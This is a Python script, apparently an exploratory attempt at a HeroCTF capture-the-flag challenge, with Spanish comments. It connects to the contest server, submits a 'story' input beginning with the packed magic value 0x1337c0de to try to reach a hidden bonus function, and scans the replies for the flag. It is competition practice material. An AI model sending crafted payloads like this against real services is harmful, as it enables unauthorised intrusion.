#!/usr/bin/env python3
import socket
import time
import struct

# El valor mágico es 0x1337c0de
# Necesito encontrar cómo pasar este valor a bonus_entry

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect(('dyn06.heroctf.fr', 13683))

def recv_until(s, text, max_bytes=4096):
    data = b''
    count = 0
    while text not in data and count < max_bytes:
        try:
            chunk = s.recv(1024)
            if not chunk:
                break
            data += chunk
            count += len(chunk)
        except socket.timeout:
            break
    return data.decode('utf-8', errors='ignore')

try:
    recv_until(s, b'> ', 500)
    
    # Probar con la longitud exacta del valor mágico (pero es muy grande)
    # O tal vez necesito usar el valor mágico de otra manera
    
    # Opción 1: Submit story
    s.send(b'1\n')
    recv_until(s, b': ', 500)
    
    # Longitud 64
    s.send(b'64\n')
    recv_until(s, b': ', 500)
    
    # Historia con el valor mágico como bytes al inicio
    magic_bytes = struct.pack('<Q', 0x1337c0de)
    story = magic_bytes + b'A' * (64 - len(magic_bytes))
    s.send(story + b'\n')
    time.sleep(1)
    recv_until(s, b'> ', 2000)
    
    # Ver info del jurado (muestra jury_gift)
    s.send(b'3\n')
    time.sleep(1)
    info = recv_until(s, b'> ', 2000)
    print("JURY INFO:", info)
    
    # Ver resultados
    s.send(b'4\n')
    time.sleep(1)
    results = recv_until(s, b'> ', 2000)
    print("\nRESULTS:", results)
    
    if 'Hero{' in results or 'Hero{' in info:
        print("\n*** FLAG FOUND ***")
        import re
        flag_match = re.search(r'Hero\{[^}]+\}', results + info)
        if flag_match:
            print("FLAG:", flag_match.group(0))
    
except Exception as e:
    print(f"Error: {e}")
    import traceback
    traceback.print_exc()
finally:
    s.close()
